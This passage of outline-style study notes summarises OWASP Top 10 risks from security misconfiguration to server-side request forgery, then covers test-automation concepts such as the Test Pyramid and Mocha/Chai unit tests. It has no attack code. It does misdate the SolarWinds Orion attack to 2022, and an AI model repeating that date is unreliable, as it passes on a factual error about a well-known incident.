&nbsp;			§ Secure design can mitigate implementation issues, but secure implementation cannot fix insecure design.

&nbsp;		○ Why It Happens

&nbsp;			§ Lack of security-focused culture in development.

&nbsp;			§ Misunderstanding of business risks (e.g., GDPR privacy requirements).

&nbsp;			§ Missing or undocumented SDLC processes.

&nbsp;			§ User stories focusing only on functionality, without security requirements.

&nbsp;			§ Relying on hope instead of strategy (“Hope is not a strategy”).

&nbsp;		○ Business Impact

&nbsp;			§ Applications may violate compliance (e.g., GDPR fines).

&nbsp;			§ More costly to remediate insecure design after deployment.

&nbsp;			§ Poor design can leave systems exposed even if implementation is perfect.

&nbsp;		○ Indicators of Insecure Design

&nbsp;			§ No documented development processes or SDLC.

&nbsp;			§ Absence of security-related user stories.

&nbsp;			§ No security testing tools in CI/CD pipelines.

&nbsp;			§ Lack of SBOM (Software Bill of Materials) to track dependencies.

&nbsp;		○ Strategies for Detection \& Prevention

&nbsp;			§ Documentation review (SDLC, SBOM, test cases).

&nbsp;			§ Threat modeling: simulate attacker behavior to identify weak points.

&nbsp;			§ Reference architectures: adopt secure-by-design templates from AWS, Azure, GCP.

&nbsp;			§ Secure design patterns: write down and enforce practices (e.g., never put user IDs in URLs).

&nbsp;			§ Misuse/abuse cases: define and test against malicious scenarios.

&nbsp;			§ Security testing tools integrated into pipelines.

&nbsp;		○ Maturity Models for Secure Design

&nbsp;			§ OWASP SAMM (Software Assurance Maturity Model).

&nbsp;			§ BSIMM (Building Security In Maturity Model) by Synopsys.

&nbsp;			§ Both help organizations measure and improve secure design practices over time.



A5: Security Misconfiguration

&nbsp;	• Security misconfiguration occurs when applications, servers, or infrastructure are deployed with insecure, default, or poorly maintained configurations. These flaws can expose sensitive information, enable unauthorized access, and even lead to full system compromise. Preventing misconfiguration requires hardening standards, patching, monitoring, and change control discipline across the entire application stack.

&nbsp;	• Key Concepts

&nbsp;		○ Definition \& Scope

&nbsp;			§ Security misconfiguration = insecure defaults, incomplete configurations, or failure to maintain updates.

&nbsp;			§ It’s not just coding; it’s about secure deployment and ongoing maintenance.

&nbsp;			§ Applies to OS, frameworks, libraries, cloud services, and app infrastructure.

&nbsp;		○ Common Examples

&nbsp;			§ Open cloud storage with weak access controls.

&nbsp;			§ Verbose error messages exposing stack traces, web server details, or internal network info.

&nbsp;			§ Unpatched components with known vulnerabilities (apps, OS, libraries, frameworks).

&nbsp;			§ Default installation artifacts like README files, sample apps, status pages.

&nbsp;			§ World-readable config files with credentials (e.g., phpinfo() exposing MySQL backend).

&nbsp;			§ Old/unused libraries or features left enabled.

&nbsp;			§ Misconfigured account lockouts (e.g., allowing 10,000 failed logins).

&nbsp;		○ Causes

&nbsp;			§ Lack of hardening standards for infrastructure components.

&nbsp;			§ Infrastructure changes (new OS/web server deployments reintroducing defaults).

&nbsp;			§ Application changes (new libraries/frameworks introducing new configs).

&nbsp;			§ Neglected patching – new vulnerabilities emerge daily, with exploits appearing within hours of disclosure.

&nbsp;		○ Impact

&nbsp;			§ Can range from minor information disclosure to complete system compromise.

&nbsp;			§ Attackers actively look for overlooked or default configurations.

&nbsp;			§ Misconfigured storage or config files can lead to data breaches.

&nbsp;		○ Best Practices for Prevention

&nbsp;			§ Documented, repeatable hardening standards for every component.

&nbsp;			§ Apply patches and updates quickly (time-to-exploit is very short).

&nbsp;			§ Remove unnecessary features, services, and components.

&nbsp;			§ Carefully review config files line by line (not just presence of settings, but appropriateness).

&nbsp;			§ Deny-all-first approach to access control (esp. cloud storage).

&nbsp;			§ Segmentation and containerization to limit blast radius of misconfigs.

&nbsp;			§ Logging and monitoring in place and validated (produce logs on demand for IR).

&nbsp;		○ Guidance \& References

&nbsp;			§ CIS Benchmarks: trusted hardening guides for OS, servers, cloud services.

&nbsp;			§ Lenny Zeltser’s Critical Log Review Checklist (zeltser.com): excellent practical resource for security logging.



A6: Vulnerable an Outdated Components

&nbsp;	• Applications often rely on third-party components (libraries, frameworks, modules), which can introduce critical vulnerabilities if not kept up-to-date. Unlike misconfigurations, these flaws cannot be fixed by tuning settings—you must patch, upgrade, or remove the vulnerable component. Managing these risks requires visibility, monitoring, and a disciplined maintenance process.

&nbsp;	• Key Concepts

&nbsp;		○ Difference from Misconfigurations

&nbsp;			§ Misconfigurations = security settings that can be adjusted to match risk appetite.

&nbsp;			§ Outdated components = known vulnerabilities in the component itself; no config change can fix it.

&nbsp;		○ Business Impact

&nbsp;			§ Fixing/upgrading a component can be costly and disruptive.

&nbsp;			§ Organizations may be forced to “ride out the storm” when critical frameworks are vulnerable (e.g., Drupalgeddon, Log4Shell).

&nbsp;			§ Risk severity depends on both technical impact and business context.

&nbsp;		○ Complexity \& Visibility

&nbsp;			§ Applications become ecosystems of custom code + third-party libraries.

&nbsp;			§ Without an inventory (SBOM – Software Bill of Materials), it’s hard to know if your app is vulnerable.

&nbsp;		○ Developer Practices \& Risks

&nbsp;			§ Developers often include third-party libraries for speed without knowing their security posture.

&nbsp;			§ If dev teams avoid upgrades to prevent breaking changes, risk of outdated vulnerable components increases.

&nbsp;			§ Secure configuration files of these components must also be validated.

&nbsp;		○ Best Practices to Mitigate Risks

&nbsp;			§ Remove unnecessary components (streamlining reduces both risk and operational overhead).

&nbsp;			§ Build and maintain an SBOM (name, version, source, use case).

&nbsp;			§ Use only trusted, digitally signed components from reliable sources.

&nbsp;			§ Establish a monitoring process for component updates and support activity.

&nbsp;			§ Watch for abandoned/dormant open-source projects (no patches = higher risk).

&nbsp;		○ Tools \& Resources

&nbsp;			§ OWASP Dependency-Check: software composition analysis tool for Java \& .NET (CLI, build plugins, Jenkins, SonarQube, etc.).

&nbsp;			§ CVE Database (MITRE): searchable repository of known vulnerabilities.

&nbsp;			§ Other integrations (e.g., SonarQube) can extend visibility.



A7: Identification and Authentication

&nbsp;	• Identification and authentication failures occur when applications have weak or poorly implemented login, password, and session management mechanisms. These failures allow attackers to bypass authentication, reuse stolen credentials, exploit default/weak passwords, or hijack sessions. The result can range from minor privacy violations to severe breaches, depending on the sensitivity of the application and data.

&nbsp;	• Key Concepts

&nbsp;		○ Sources of Risk

&nbsp;			§ Stolen credentials: Many usernames/passwords are available on the dark web.

&nbsp;			§ Default credentials: Often left unchanged in older tech or admin interfaces.

&nbsp;			§ Brute force attacks: Automated tools testing multiple combinations.

&nbsp;			§ Session hijacking: Reuse of unexpired session tokens.

&nbsp;		○ Causes

&nbsp;			§ Lack of secure Identity \& Access Management (IAM) planning early in development.

&nbsp;			§ Weak or absent session management controls.

&nbsp;			§ Poor password policy or failure to block compromised/weak passwords.

&nbsp;			§ Inadequate account lockout mechanisms.

&nbsp;			§ Weak password reset mechanisms (exploitable security questions).

&nbsp;			§ Storing passwords improperly (plaintext is worst, hashing is best).

&nbsp;		○ Questions to Ask Early in Development

&nbsp;			§ How strong do passwords need to be?

&nbsp;			§ Will passwordless or MFA be required?

&nbsp;			§ Are default/weak passwords prohibited?

&nbsp;			§ What are session expiration and lockout policies?

&nbsp;			§ Can multiple concurrent logins from different devices be restricted?

&nbsp;		○ Impacts

&nbsp;			§ Minor: Privacy issues (e.g., library account exposing borrowing history).

&nbsp;			§ Severe:

&nbsp;				□ Banking apps → financial theft.

&nbsp;				□ Infrastructure admin apps → takeover or disruption of critical systems.

&nbsp;		○ Best Practices

&nbsp;			§ Password security:

&nbsp;				□ Strong complexity requirements.

&nbsp;				□ Prohibit known compromised passwords.

&nbsp;				□ Use hashing for storage.

&nbsp;			§ MFA (multifactor authentication): Strong defense even if credentials are stolen.

&nbsp;			§ Session management:

&nbsp;				□ Server-side enforcement preferred.

&nbsp;				□ Proper session ID handling (avoid URL-based IDs).

&nbsp;			§ Account lockouts: Based on failed login attempts and/or IP-level

&nbsp;			§ Thoughtful password reset: Avoid guessable recovery questions.

&nbsp;		○ OWASP Guidance

&nbsp;			§ Cheat Sheets available for:

&nbsp;				□ Authentication

&nbsp;				□ Credential stuffing prevention

&nbsp;				□ Password resets

&nbsp;				□ Session management

&nbsp;			§ OWASP Proactive Controls (C6) \& NIST guidance:

&nbsp;				□ Level 1: Passwords

&nbsp;				□ Level 2: MFA

&nbsp;				□ Level 3: Cryptographic-based authentication



A8: Software and Data Integrity

&nbsp;	• Software and data integrity failures occur when trust in software components, data, or infrastructure is misplaced, leading to potential exploitation. These risks emphasize the need for validation, strong CI/CD controls, secure SDLC practices, and vigilance against supply chain attacks.

&nbsp;	• Key Concepts

&nbsp;		○ Definition \& Scope

&nbsp;			§ Based on assumed trust in:

&nbsp;				□ Data inputs.

&nbsp;				□ Software components and updates.

&nbsp;				□ Infrastructure elements.

&nbsp;			§ If trust is misplaced → security incidents or breaches.

&nbsp;		○ Evolution from Insecure Deserialization

&nbsp;			§ 2017’s “Insecure Deserialization” evolved into broader software/data integrity risks.

&nbsp;			§ Both relate to vulnerabilities where untrusted or manipulated code/data compromises security.

&nbsp;		○ Update \& Supply Chain Risks

&nbsp;			§ Application integrity can be compromised during:

&nbsp;				□ Automatic or manual updates.

&nbsp;				□ Pulling libraries from external repositories.

&nbsp;			§ Example: Python PyPI ransomware incident (2022) — malicious library downloaded hundreds of times.

&nbsp;			§ Example: SolarWinds Orion attack (2022) — malicious update affected 30,000+ organizations.

&nbsp;		○ CI/CD Pipeline Threats

&nbsp;			§ Pipelines can be a point of failure:

&nbsp;				□ Unrestricted/unaudited changes.

&nbsp;				□ Weak access control.

&nbsp;				□ Misconfigurations.

&nbsp;			§ Malicious code can slip into production if CI/CD trust is broken.

&nbsp;		○ Mitigation Strategies

&nbsp;			§ Digital Signature Validation

&nbsp;				□ Integrate signature checks into code and updates.

&nbsp;				□ Validate libraries and third-party components.

&nbsp;			§ SBOM (Software Bill of Materials)

&nbsp;				□ Inventory of all components, dependencies, and libraries.

&nbsp;				□ Starting point for signature validation and vulnerability scanning.

&nbsp;			§ Secure SDLC Practices

&nbsp;				□ Strong code reviews to detect untrusted code.

&nbsp;				□ Change control to prevent insecure deployments.

&nbsp;			§ Controlled Dependency Management

&nbsp;				□ Vet libraries → publish to internal trusted repo.

&nbsp;				□ Allow developers to pull only from controlled sources.

&nbsp;		○ Supporting Tools (OWASP Projects)

&nbsp;			§ CycloneDX

&nbsp;				□ BOM standard (software, SaaS, ops, manufacturing).

&nbsp;				□ Supports vulnerability advisory format.

&nbsp;				□ Offers 200+ automation tools.

&nbsp;			§ Dependency-Check

&nbsp;				□ Software composition analysis (SCA).

&nbsp;				□ Identifies libraries and checks against vulnerability databases.



A9: Security Logging and Monitoring Failures

&nbsp;	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without these, attackers can operate undetected, increasing the risk of data breaches, system takeovers, and costly outages. Strong logging and monitoring—combined with centralization, real-time alerting, and secure storage—are essential to detect, respond to, and contain attacks early.

&nbsp;	• Key Concepts

&nbsp;		○ Why Failures Happen

&nbsp;			§ Developers often prioritize functionality and go-live deadlines over security logging.

&nbsp;			§ Lack of security training and awareness in development teams.

&nbsp;			§ Absence of logging/monitoring policies, standards, and documentation.

&nbsp;			§ Logging is often implemented only for troubleshooting, not for security.

&nbsp;		○ Risk Progression During Attacks

&nbsp;			§ Reconnaissance phase: attackers scan and probe apps. If caught here → minimal damage.

&nbsp;			§ Exploitation phase: attacks like SQL injection or brute force attempts. If detected here → partial damage but containable.

&nbsp;			§ Compromise phase: full breach/system takeover if logging fails. Very costly.

&nbsp;		○ Building Logging \& Monitoring (Pyramid Approach)

&nbsp;			§ Foundation: Ensure auditable events are being logged.

&nbsp;			§ Log Content: Logs must have enough detail to explain what happened.

&nbsp;			§ Monitoring: Logs must be actively reviewed; alerts should be near real-time.

&nbsp;			§ Storage: Logs should be centralized and protected, not stored locally where attackers can tamper with them.

&nbsp;			§ Integrity Controls: Ensure logs cannot be altered or deleted without detection.

&nbsp;		○ High-Value Targets for Logging

&nbsp;			§ Login activity (both successes and failures).

&nbsp;			§ Access control failures.

&nbsp;			§ Input validation failures.

These are often strong indicators of malicious behavior.

&nbsp;		○ Best Practices

&nbsp;			§ Centralize logs to internal servers for correlation and protection.

&nbsp;			§ Enable real-time alerts for suspicious activity.

&nbsp;			§ Apply integrity controls to detect tampering or log removal.

&nbsp;			§ Ensure timely review of logs and alerts by the security team.

&nbsp;		○ Resources for Guidance

&nbsp;			§ OWASP Cheat Sheets (logging, monitoring, misconfiguration).

&nbsp;			§ NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide.

&nbsp;			§ ICS 500-27: Intelligence Community standard for audit data collection and sharing.



A10: Server-Side Request Forgery

&nbsp;	• Server-Side Request Forgery (SSRF) occurs when an application allows attackers to make unauthorized requests from the server to internal or external systems. This can expose sensitive files, internal services, or cloud resources, and potentially allow attackers to execute malicious code or cause denial of service. SSRF is a growing risk, especially with cloud adoption, and requires strong validation, segmentation, and preventive controls.

&nbsp;	• Key Concepts

&nbsp;		○ What SSRF Is

&nbsp;			§ Attackers trick a server into making requests it shouldn’t (e.g., to internal services, local files, or attacker-controlled endpoints).

&nbsp;			§ Differs from command injection: SSRF is about forcing requests, not directly executing commands.

&nbsp;			§ Often arises when applications blindly trust user-supplied URLs.

&nbsp;		○ What Attackers Can Do with SSRF

&nbsp;			§ Access sensitive local files (e.g., /etc/passwd on Linux)

&nbsp;			§ Map the internal network (hostnames, IPs, open ports).

&nbsp;			§ Force internal systems to connect to attacker-controlled URLs.

&nbsp;			§ Trigger malicious code execution on internal servers.

&nbsp;			§ Cause denial of service conditions.

&nbsp;			§ Exploit cloud misconfigurations (e.g., overexposed S3 buckets, cloud metadata services).

&nbsp;		○ Detection \& Testing

&nbsp;			§ Look for URL validation weaknesses (does the app trust all URLs blindly?).

&nbsp;			§ Review application architecture for segmentation — is the app isolated from sensitive resources?

&nbsp;			§ Test for unexpected protocols (not just HTTP — e.g., file://, gopher://, ftp://).

&nbsp;		○ Preventive Controls

&nbsp;			§ Input validation \& sanitization of user-supplied URLs.

&nbsp;			§ Disallow or restrict HTTP redirects, which can be abused for SSRF.

&nbsp;			§ Network segmentation: restrict servers to only necessary outbound ports/services.

&nbsp;			§ Cloud configuration standards: enforce least privilege and restrict access to cloud metadata/storage.

&nbsp;			§ Allow lists (preferred over deny lists): explicitly define “known good” destinations.

&nbsp;			§ Logging \& monitoring of abnormal outbound requests.

&nbsp;		○ Resources

&nbsp;			§ OWASP SSRF Prevention Cheat Sheet: practical developer-focused examples and controls.

&nbsp;			§ “SSRF Bible” (Wallarm Research Team): detailed 23-page guide expanding on OWASP guidance.





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Test Automation

#### Test Types



Agile Testing Quadrants

&nbsp;	• The Agile Testing Quadrants, created by Brian Marick in 2003, provide a framework to classify different types of tests in Agile development. The quadrants help teams decide which tests to automate, when to run them, and what resources are needed. The model organizes tests along two axes:

&nbsp;		○ Business-facing vs. Technology-facing

&nbsp;		○ Guides development vs. Critiques the product

&nbsp;	• Key Concepts



&nbsp;		○ The Four Quadrants

&nbsp;			§ Quadrant 1 (Bottom-left)

&nbsp;				• Technology-facing, guides development

&nbsp;				• Always automated

&nbsp;				• Ensures code quality foundation and confirms functionality while coding

&nbsp;				• Examples: Unit tests, integration tests, component tests

&nbsp;				• Written during development and run frequently

&nbsp;			§ Quadrant 2 (Top-left)

&nbsp;				• Business-facing, guides development

&nbsp;				• Automated or manual

&nbsp;				• Helps validate features and confirm business requirements

&nbsp;				• Examples: Functional tests, UI tests, prototypes, mockups

&nbsp;				• Often part of the Definition of Done for a user story

&nbsp;			§ Quadrant 3 (Top-right)

&nbsp;				• Business-facing, critiques the product

&nbsp;				• Mostly manual (can have automation support)

&nbsp;				• Provides feedback on user experience and workflows

&nbsp;				• Requires critical thinking and observation

&nbsp;				• Examples: Exploratory testing, usability testing, A/B testing

&nbsp;			§ Quadrant 4 (Bottom-right)

&nbsp;				• Technology-facing, critiques the product

&nbsp;				• Automated and tool-driven

&nbsp;				• Provides targeted data about performance and reliability

&nbsp;				• Examples: Performance testing, load testing, security testing, reliability testing (anything ending in “-ility”)

&nbsp;				• Performed based on system priorities

&nbsp;		○ Guiding Principles

&nbsp;			§ The quadrants are not sequential (numbers don’t imply order).

&nbsp;			§ Teams don’t need tests in every quadrant — testing strategy depends on context and priorities.

&nbsp;			§ The model ensures balanced coverage of both business value and technical quality.

&nbsp;			§ Helps teams continuously think about what tests matter most during planning, development, and releases.



The Test Pyramid

&nbsp;	• The Test Pyramid, introduced by Mike Cohn in Succeeding with Agile (2009), is a model that illustrates the ideal balance of automated tests in a project. It shows how many tests should exist at each level (unit, integration, UI) to achieve a fast, reliable, and maintainable test suite.

&nbsp;	• Key Concepts

&nbsp;		○ Structure of the Pyramid

&nbsp;			§ Unit Tests (Base)

&nbsp;				□ Fastest, most isolated tests (milliseconds)

&nbsp;				□ Test single functions with mocked or stubbed data

&nbsp;				□ Form the largest portion of the test suite

&nbsp;				□ Ensure correctness of individual pieces of code

&nbsp;			§ Integration Tests (Middle)

&nbsp;				□ Service-level tests, slower than unit but faster than UI (10–100 ms)

&nbsp;				□ Validate multiple services working together (DB, file systems, APIs)

&nbsp;				□ Generate their own data

&nbsp;				□ Ensure smooth communication and system integrity

&nbsp;			§ UI Tests (Top)

&nbsp;				□ End-to-end workflows, simulate real user actions (clicking, typing)

&nbsp;				□ Run through a browser (seconds to minutes per test)

&nbsp;				□ Very valuable for user perspective, but slow and costly to maintain

&nbsp;				□ Should be kept to a small number, covering primary workflows

&nbsp;		○ Why the Pyramid Shape Matters

&nbsp;			§ Bottom-heavy is ideal → fast, cheap tests at scale with fewer but valuable top-level UI tests.

&nbsp;			§ Anti-patterns:

&nbsp;				□ Square shape → too many unit tests only, gaps in coverage for workflows.

&nbsp;				□ Inverted pyramid → too many UI tests, slow feedback, hard maintenance.

&nbsp;			§ The pyramid promotes test efficiency, speed, and reliability.

&nbsp;		○ Flexibility of the Model

&nbsp;			§ Not limited to just 3 levels — can include additional test types (e.g., performance, security).

&nbsp;			§ Each team’s pyramid may look different depending on project needs.

&nbsp;			§ The goal is to be intentional about the test strategy and understand the trade-offs of different “shapes.”







Unit Test

&nbsp;	• Unit tests are the foundation of automated testing and are critical for ensuring that application functionality works correctly. They should be fast, simple, and focused on testing one thing at a time. The transcript illustrates this with a practical example of writing and running unit tests for a middleware function in a Node.js/Express application.

&nbsp;	• Key Concepts

&nbsp;		○ The Example Application

&nbsp;			§ AI Animal Art Store (fictional):

&nbsp;				□ Built with Node.js and Express

&nbsp;				□ Features include: browsing art, adding items to cart, viewing/updating cart, and checkout

&nbsp;				□ Uses a SQL database with two tables: items (products) and cart (cart items/quantities)

&nbsp;				□ Middleware handles logic such as calculating total price, error handling, validating input, logging requests

&nbsp;		○ Unit Testing Principles

&nbsp;			§ Purpose: Validate small, isolated pieces of functionality (e.g., a middleware function).

&nbsp;			§ Characteristics:

&nbsp;				□ Fast (milliseconds)

&nbsp;				□ Simple

&nbsp;				□ Test only one thing at a time

&nbsp;		○ Testing Frameworks and Tools

&nbsp;			§ Mocha → testing framework (supports BDD-style tests).

&nbsp;			§ Chai → assertion library (verifies expected outcomes).

&nbsp;			§ Sinon → mocks and stubs dependencies (fakes objects/data to isolate tests).

&nbsp;		○ Practical Example: Testing calculateTotalPrice Middleware

&nbsp;			§ Setup:

&nbsp;				□ Import the middleware under test

&nbsp;				□ Mock req (request) object with items and quantities

&nbsp;				□ Mock res object (empty)

&nbsp;				□ Use sinon.spy() to track the next() call

&nbsp;			§ Tests Written:

&nbsp;				□ Should calculate total price → verifies correct calculation of item totals.

&nbsp;				□ Should handle empty cart → ensures total is 0 when req.items is empty.

&nbsp;				□ Should handle missing quantities → ensures total is 0 if no quantity exists for an item.

&nbsp;			§ Execution:

&nbsp;				□ un with npx mocha test/unit/calculateTotalPrice.test.js

&nbsp;				□ Output shows all tests passing in ~6ms.



Integration Test

&nbsp;	• Integration tests validate that different parts of an application work together seamlessly. Unlike unit tests (which test small, isolated pieces), integration tests focus on cross-module processes and end-to-end flows. They give confidence that the system behaves correctly when multiple components interact.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Integration Tests

&nbsp;			§ Ensure whole-system functionality, not just isolated parts.

&nbsp;			§ Detect failures caused by interactions between modules.

&nbsp;			§ Cover cross-module processes that can’t be validated with unit tests.

&nbsp;			§ Useful when some parts of code are not unit-testable in isolation.

&nbsp;		○ Example: AI Animal Art Application

&nbsp;			§ Frameworks \& Tools Used:

&nbsp;				• Mocha → test framework (BDD style)

&nbsp;				• Supertest → simulate HTTP requests

&nbsp;				• Chai → assertions

&nbsp;				• SQLite (in-memory) → isolated test DB (avoids affecting production data)

&nbsp;			§ Test File: routes.test.js

&nbsp;				• Before Hook → creates items and cart tables, inserts initial data

&nbsp;				• After Hook → drops tables to clean up after test

&nbsp;		○ Integration Tests Implemented

&nbsp;			§ Add to Cart (POST request)

&nbsp;				• Simulates adding item with ID 1

&nbsp;				• Verifies response status, redirect URL, and database insertion

&nbsp;			§ Display Cart Page (GET request)

&nbsp;				• Inserts item with ID 1, quantity 2

&nbsp;				• Simulates request to /cart

&nbsp;				• Verifies status and that the cart page includes item name

&nbsp;			§ Checkout Page (GET request)

&nbsp;				• Inserts item with ID 1, quantity 2

&nbsp;				• Simulates request to /checkout

&nbsp;				• Verifies status and presence of message "Thanks for your order."

&nbsp;		○ Performance \& Characteristics

&nbsp;			§ Still fast (55ms), but slower than unit tests (6ms) because:

&nbsp;				• Requires DB queries

&nbsp;				• Simulates HTTP requests

&nbsp;				• Waits for responses

&nbsp;			§ Provides broader system confidence at a higher cost compared to unit tests.



UI Test

&nbsp;	• UI tests (also called end-to-end or functional tests) validate complete application workflows by simulating real user interactions in a browser. They ensure the frontend UI, backend systems, and databases all work together correctly. While extremely valuable, they are slower, harder to set up, and more resource-intensive compared to unit and integration tests.

&nbsp;	• Key Concepts

&nbsp;		○ Role of UI Tests

&nbsp;			§ Complement lower-level tests (unit, integration) by covering gaps.

&nbsp;			§ Provide a user’s perspective on whether the application works as expected.

&nbsp;			§ Simulate real-world workflows → e.g., add to cart → checkout.

&nbsp;			§ Act as a form of integration testing, since they exercise the full system stack.

&nbsp;		○ Technical Characteristics

&nbsp;			§ Always run in a browser (Chrome, Firefox, etc.).

&nbsp;			§ Require specific browser versions and environments (harder setup).

&nbsp;			§ Slower execution due to many moving parts: launching browser, rendering UI, simulating clicks, waiting for responses.

&nbsp;				• Unit test: ~5ms

&nbsp;				• Integration test: ~50ms

&nbsp;				• UI test: ~624ms (~1s)



#### How to Approach Automation



Get the Whole Team Involved

&nbsp;	• For test automation to succeed in a software delivery project, it must be a shared responsibility across the entire team—not just testers. Developers, testers, and business stakeholders (like product managers and business analysts) all play essential roles in planning, executing, and maintaining an effective, valuable automation strategy.

&nbsp;	• Key Concepts

&nbsp;		○ Team Involvement

&nbsp;			§ Whole team participation: developers, testers, product managers, and business analysts.

&nbsp;			§ Collaboration ensures that test automation reflects both technical needs and business priorities.

&nbsp;			§ Creates shared accountability → quality is everyone’s responsibility.

&nbsp;		○ Planning and Strategy

&nbsp;			§ Begin with a shared big picture → align expectations across roles.

&nbsp;			§ Hold cross-functional brainstorming sessions to define what makes a “good test suite.”

&nbsp;			§ Use models like the Agile Testing Quadrants and the Test Pyramid to structure discussions about:

&nbsp;				• Types of tests needed

&nbsp;				• Test tools to be used

&nbsp;				• Ownership of different test levels

&nbsp;			§ Ownership of Tests

&nbsp;				• Unit tests → typically owned by developers (written during development).

&nbsp;				• Integration tests → often shared between developers and testers.

&nbsp;				• UI tests → usually owned by testers.

&nbsp;				• Ownership isn’t exclusive—team members can and should help each other.

&nbsp;			§ Ongoing Collaboration

&nbsp;				• Hold retrospectives every few months to reflect on what’s working, what needs improvement.

&nbsp;				• Encourage knowledge-sharing and cross-support:

&nbsp;					® Stakeholders help identify high-priority scenarios.

&nbsp;					® Stakeholders help identify high-priority scenarios.

&nbsp;					® Testers help developers with edge cases.

&nbsp;					® Developers assist testers in writing UI scripts.

&nbsp;					® Testers and developers report results back to stakeholders.

&nbsp;		○ Sustainability \& Evolution

&nbsp;			§ Test automation is an ongoing process—new tests will always be added, and old ones may need maintenance.

&nbsp;			§ Teams should work to keep the suite lean, valuable, and maintainable.

&nbsp;			§ A teamwide investment in automation leads to a robust and reliable test suite.

&nbsp;			



Make a Strategy

&nbsp;	• Before writing tests, teams should plan and document a clear testing strategy. This involves identifying priority features, deciding what to automate versus keep manual, defining the scope of test types, and determining the resources and environments required. A strategy ensures test automation is efficient, maintainable, and aligned with business priorities.

&nbsp;	• Key Concepts

&nbsp;		○ Prioritize Features

&nbsp;			§ Start with business stakeholders → they provide the list of highest priority features.

&nbsp;			§ Align testing with business value and critical functionality.

&nbsp;		○ Decide What to Automate vs. Manual

&nbsp;			§ Good candidates for automation:

&nbsp;				• High-impact features

&nbsp;				• Tedious, repetitive tasks

&nbsp;				• Scenarios with predictable, consistent results

&nbsp;			§ Manual testing is better for exploratory, usability, or one-off checks.

&nbsp;		○ Apply the Test Pyramid

&nbsp;			§ Push automation to the lowest level possible:

&nbsp;				• Unit tests → largest number, fastest feedback

&nbsp;				• Integration tests → moderate number

&nbsp;				• UI tests → fewest, only for critical workflows

&nbsp;			§ If a scenario can be validated without the UI, avoid UI automation to reduce complexity and execution time.

&nbsp;		○ Define Test Suite Scope Early

&nbsp;			§ Decide which test types (unit, integration, UI, others like performance/security) will be included.

&nbsp;			§ Define scope early, but remain flexible for changes later in the project.

&nbsp;		○ Plan Resources

&nbsp;			§ Consider what’s needed for test automation success:

&nbsp;				• Test data → how it will be used, created, managed

&nbsp;				• Tooling → frameworks and libraries for building/running tests

&nbsp;				• Test environments → availability for both automated and manual testing

&nbsp;			§ Make a list of resources required to support testing efforts.

&nbsp;		○ Document the Testing Strategy

&nbsp;			§ Captures decisions, scope, and resources.

&nbsp;			§ Serves as guidance for current and future teammates.

&nbsp;			§ Provides a consistent approach for planning, executing, and maintaining automation.



Test Tools

&nbsp;	• Choosing the right test tools should follow test strategy decisions, not precede them. Teams should first define how they want tests to be structured, then evaluate and experiment with tools that best fit their needs. The process should be collaborative, criteria-based, and iterative, leading to better collaboration and more effective test automation.

&nbsp;	• Key Concepts

&nbsp;		○ Tools Come After Strategy

&nbsp;			§ Don’t pick tools too early — first decide:

&nbsp;				• What types of tests (unit, integration, UI, etc.) will be automated.

&nbsp;				• How tests will be expressed (style, frameworks, BDD vs TDD, etc.).

&nbsp;			§ Avoid limiting options by prematurely locking into a toolset.

&nbsp;		○ Baseline Requirements

&nbsp;			§ Two baseline criteria for selecting tools:

&nbsp;				• Type of test to implement (unit, integration, UI, performance, etc.).

&nbsp;				• Programming language in which the tests will be written.

&nbsp;			§ Example: choosing a JavaScript unit testing framework if the project code is JS.

&nbsp;		○ Promote Cross-Functional Collaboration

&nbsp;			§ Prefer tools that enable collaboration among:

&nbsp;				• Developers (writing unit/integration tests).

&nbsp;				• Testers (creating UI or exploratory tests).

&nbsp;				• Business stakeholders (contributing scenarios, reviewing results).

&nbsp;			§ Collaboration improves code testability and reduces defects.

&nbsp;		○ Experimentation with Spikes

&nbsp;			§ Use spikes (small experiments) with potential tools to:

&nbsp;				• Learn how they work technically.

&nbsp;				• Explore ease of use, integrations, and limitations.

&nbsp;				• Document pros and cons.

&nbsp;			§ Bring results back to the larger team for informed discussion.

&nbsp;		○ Decision-Making

&nbsp;			§ There is no single perfect tool for every project.

&nbsp;			§ Goal: select the best-fit tools for each type of testing based on team needs and findings.

&nbsp;			§ The decision should be team-based and consensus-driven.



Development Process

&nbsp;	• Different types of automated tests should be written and executed at specific points in the software delivery life cycle. Establishing clear processes for when to write and when to run tests (both locally and in CI/CD) ensures consistent quality, faster feedback, and higher confidence in software changes.

&nbsp;	• Key Concepts

&nbsp;		○ When to Write Tests

&nbsp;			§ Unit tests → written during development, ideally using Test-Driven Development (TDD) (tests written before code).

&nbsp;			§ Integration tests → also written during development, once features are far enough along to test multiple components together.

&nbsp;			§ UI tests → can start during development, but completed only after the feature is fully developed.

&nbsp;		○ When to Run Tests

&nbsp;			§ Local Execution:

&nbsp;				• Developers should run tests locally before making code changes.

&nbsp;				• Ensures immediate feedback and prevents breaking builds.

&nbsp;			§ Continuous Integration (CI):

&nbsp;				• Test suite should run automatically after code is committed.

&nbsp;				• Provides fast, automated verification in shared environments.

&nbsp;		○ Best Practices

&nbsp;			§ Run tests frequently throughout development.

&nbsp;			§ Ensure test results remain green (passing) to maintain trust in the test suite.

&nbsp;			§ Build processes where testing is an integral part of daily workflow, not an afterthought.

&nbsp;			§ Regular testing improves team discipline, skill, and confidence with automation.



Follow Test Design Patterns

&nbsp;	• Using design principles and patterns in test automation helps keep tests consistent, maintainable, and cost-effective over the long term. By reducing duplication, improving readability, and ensuring clear structure, teams can build test suites that provide fast, useful feedback and are easier to update as systems evolve.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Test Design Patterns

&nbsp;			• Reduce the cost of writing and maintaining automated tests.

&nbsp;			• Ensure tests are understandable, reusable, and reliable.

&nbsp;			• Provide a shared structure and style for the team to follow.

&nbsp;		○ Core Principles \& Practices

&nbsp;			• DRY (Don’t Repeat Yourself):

&nbsp;				□ Avoid duplication in test code.

&nbsp;				□ Shared/reusable components mean updates only need to be made in one place.

&nbsp;			• DSL (Domain-Specific Language):

&nbsp;				□ Use descriptive, meaningful names for items in the test application.

&nbsp;				□ Establish a common language for both code and tests → improves communication across the team.

&nbsp;			• Single Purpose per Test:

&nbsp;				□ Each test should validate one behavior only.

&nbsp;				□ Results in clearer scope, easier debugging, and simpler updates when business rules change.

&nbsp;			• Test Independence:

&nbsp;				□ Tests should be self-contained.

&nbsp;				□ They can run in any order without relying on data or state from other tests.

&nbsp;			• Behavior-Driven Steps:

